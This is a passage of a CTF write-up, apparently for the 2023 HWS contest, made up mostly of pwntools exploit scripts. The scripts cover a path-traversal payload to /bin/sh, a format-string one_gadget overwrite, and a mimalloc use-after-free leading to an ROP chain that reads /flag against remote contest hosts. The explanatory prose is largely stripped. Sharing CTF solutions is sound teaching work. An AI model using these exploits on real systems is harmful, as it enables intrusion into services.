class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;60.204.140.184&quot;</span>,<span class="string">&quot;30230&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">get abcabcabcabc/bin/sh?.css.html</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbLy8uLy4uLy4uLy4uL===</span><br><span class="line">Authorization: Basic</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>get abcabcabcabc/bin/bash?.css.html<span class="number">&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">21</span>+b<span class="number">&#x27;b</span><span class="number">&#x27;</span>*<span class="number">84</span>+b<span class="number">&#x27;L</span>y8uLy4uLy4uLy4uL===&#x27;</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(b<span class="number">&#x27;</span>Authorization: Basic <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sleep(1)</span></span><br><span class="line"><span class="string">io.send(b&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>wpsub_5596534A8766base64</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">b<span class="number">&#x27;</span>Authorization: Basic <span class="string">&#x27;+base64.b64encode(64*b&#x27;</span>a<span class="number">&#x27;</span>+b<span class="number">&#x27;</span>/../../../../../../../../bin/sh?.html<span class="number">&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h1><p>mainlibconegadget</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;60.204.140.184&#x27;</span>,<span class="string">&#x27;30058&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x00136D)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x013E8  )&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%18$p%21$p&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;a str: &quot;</span>,payload)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_tar=<span class="built_in">int</span>(ru(<span class="string">b&#x27;0x&#x27;</span>),<span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">p(<span class="string">&#x27;stack_tar&#x27;</span>,stack_tar)</span><br><span class="line">__libc_start_main=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line">p(<span class="string">&quot;__libc_start_main&quot;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=base+<span class="number">0xe3b01</span></span><br><span class="line"><span class="comment"># payload=fmtstr_payload(6,&#123;stack_tar:(ogg&amp;0xffffffffff)&#125;,write_size=&#x27;short&#x27;)</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">6</span>,&#123;stack_tar:(ogg)&#125;,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">sla(<span class="string">b&quot;str: &quot;</span>,payload)</span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line"><span class="comment"># print(hex(ogg))</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h1><p><a href="https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/">https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-rpath <span class="string">&#x27;/home/grxer/Desktop/share/2023hws/mi&#x27;</span> ./pwn </span><br></pre></td></tr></table></figure><p>patchUbuntu20u20</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;/home/grxer/Desktop/share/2023hws/mi&#x27; ./pwn </span><br><span class="line">patchelf --set-rpath &#x27;/home/grxer/Desktop/share/2023hws/mi/&#x27; ./libmimalloc.so.2</span><br><span class="line">patchelf --set-interpreter &#x27;/home/grxer/Desktop/share/2023hws/mi/ld.so&#x27;  ./pwn</span><br></pre></td></tr></table></figure><p>0uaf</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">1</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1<span class="number">-8</span>))</span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">3</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;b&quot;</span>*<span class="number">1</span>) #<span class="number">4</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;c&quot;</span>*<span class="number">1</span>) #<span class="number">5</span> </span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;d&quot;</span>*<span class="number">8</span>) #<span class="number">6</span></span><br></pre></td></tr></table></figure><p>12uaf22&gt;12&gt;leak1-8#6leak1-8</p><p>showmimallocmaps+0x160</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">     <span class="number">0x55060000000</span>      <span class="number">0x55064000000</span> rw-p  <span class="number">4000000</span>      <span class="number">0</span> [anon_55060000]</span><br><span class="line">pwndbg&gt; tel <span class="number">0x55060000000</span>+<span class="number">0x160</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>  <span class="number">0x55060000160</span>  <span class="number">0x7fe7da5a5740</span>  <span class="number">0x7fe7da5a5740</span></span><br></pre></td></tr></table></figure><p>0x7fe7da5a5740+0x300</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tel <span class="number">0x7fe7da5a5740</span>+<span class="number">0x300</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>  <span class="number">0x7fe7da5a5a40</span>  <span class="number">0x7fffa5cd7100</span>  <span class="number">0x5642b1dc7950</span>  endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>  <span class="number">0x7fe7da5a5a48</span>  <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>show0x7fffa5cd7100-8add+libceditorwpayloadorweditebp__libc_start_main+243-8leave ret__libc_start_main+243orweditorwpie</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc_elf=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;123.60.179.52&quot;</span>,<span class="string">&quot;30304&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">  sa(<span class="string">b&#x27; Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sa(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0016B9)&#x27;) #free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl()</span><br><span class="line">base=uu64(r(<span class="number">6</span>))&amp;<span class="number">0xfffff000000</span></span><br><span class="line"><span class="comment"># 0x3755c020461</span></span><br><span class="line"><span class="comment"># 0x3755c 000000</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">1</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;c&quot;</span>*<span class="number">1</span>) <span class="comment">#5 </span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;d&quot;</span>*<span class="number">8</span>) <span class="comment">#6</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak2=uu64(r(<span class="number">6</span>))</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">p(<span class="string">&#x27;leak2&#x27;</span>,leak2)</span><br><span class="line">p(<span class="string">&#x27;leak3&#x27;</span>,leak3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(leak3-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#11</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;h&quot;</span>*<span class="number">8</span>) <span class="comment">#12</span></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">ru(<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_stack=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;leak_stack&#x27;</span>,leak_stack)</span><br><span class="line">__libc_start_main_243_stack=leak_stack-(<span class="number">0x7ffc8d14f0d0</span>-<span class="number">0x7ffc8d14f0a8</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main_243_stack&#x27;</span>,__libc_start_main_243_stack)</span><br><span class="line"><span class="comment"># 0x1950</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">dele(<span class="number">13</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#17</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;i&quot;</span>*<span class="number">8</span>) <span class="comment">#18</span></span><br><span class="line">show(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">__libc_start_main=uu64(r(<span class="number">6</span>))-<span class="number">243</span></span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#19</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">dele(<span class="number">19</span>)</span><br><span class="line">dele(<span class="number">20</span>)</span><br><span class="line">edit(<span class="number">20</span>,p64(leak_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#21</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#22</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#23</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;j&quot;</span>*<span class="number">8</span>) <span class="comment">#24</span></span><br><span class="line">show(<span class="number">24</span>)</span><br><span class="line">ru(<span class="string">b&#x27;j&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">pie=uu64(r(<span class="number">6</span>))-<span class="number">0x1950</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">systemcall=base+libc_elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;systemcall&#x27;</span>,systemcall)</span><br><span class="line">write=base+libc_elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=base+libc_elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi=pie+<span class="number">0x00000000000019b3</span></span><br><span class="line">pop_rsi_r15=pie+<span class="number">0x00000000000019b1</span></span><br><span class="line">pop_rdx=base+<span class="number">0x0000000000142c92</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">edit_ret=__libc_start_main_243_stack-<span class="number">0x20</span></span><br><span class="line">p(<span class="string">&#x27;edit_ret&#x27;</span>,edit_ret)</span><br><span class="line">bss=__libc_start_main_243_stack+<span class="number">0x100</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi_r15)+p64(leak1)+p64(<span class="number">0xdeadbeef</span>)+p64(systemcall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">60</span>)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0xdeadbeef</span>)+p64(pop_rdx)+p64(<span class="number">60</span>)+p64(write)</span><br><span class="line">edit(<span class="number">18</span>,payload)</span><br><span class="line">leave_ret=<span class="number">0x01840</span>+pie</span><br><span class="line">p(<span class="string">&#x27;leaveret&#x27;</span>,leave_ret)</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#25</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#26</span></span><br><span class="line">dele(<span class="number">25</span>)</span><br><span class="line">dele(<span class="number">26</span>)</span><br><span class="line">edit(<span class="number">26</span>,p64(edit_ret-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#27</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#28</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#29</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#30</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#31</span></span><br><span class="line">ret=pie+<span class="number">0x1841</span></span><br><span class="line"><span class="comment"># edit(31,p64(__libc_start_main_243_stack)+p64(leave_ret))</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">31</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>)+p64(leave_ret))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">grxer@Ubantu20 ~/D/s/2/mi&gt; ROPgadget  --binary ./libc.so.6 --only &#x27;pop|ret&#x27; | grep rdx</span></span><br><span class="line"><span class="string">0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000119211 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000015f8c6 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000142c92 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x00000000000dfc12 : pop rdx ; ret 0x10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="wpeditpieexp"><a href="#wpeditpieexp" class="headerlink" title="wpeditpieexp"></a>wpeditpieexp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc_elf=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;123.60.179.52&quot;</span>,<span class="string">&quot;30304&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span 